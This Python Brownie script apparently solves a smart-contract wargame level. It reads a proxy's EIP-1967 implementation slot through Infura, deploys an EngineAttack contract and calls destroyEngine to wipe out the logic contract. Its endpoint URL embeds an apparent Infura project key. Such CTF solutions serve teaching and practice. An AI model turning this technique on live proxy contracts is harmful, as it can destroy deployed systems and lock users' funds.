from web3 import Web3
from scripts.helpful_scripts import get_account
from brownie import EngineAttack
from brownie.convert import to_bytes, to_address


def main():
    account = get_account()
    logic_addr = get_storage_slot(
        "0x6318be86c51A04c503b687cAdb88BB7Ad031340C",
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
    )
    attack = EngineAttack.deploy({"from": account})

    attack.destroyEngine(logic_addr, {"from": account})


def get_storage_slot(level_contract, slot):
    w3 = Web3(
        Web3.HTTPProvider(
            "https://rinkeby.infura.io/v3/80514b47890f4b358946727268128c71"
        )
    )
    raw_data = w3.eth.get_storage_at(level_contract, slot)
    addr = to_address(to_bytes(raw_data, "bytes20"))
    return addr
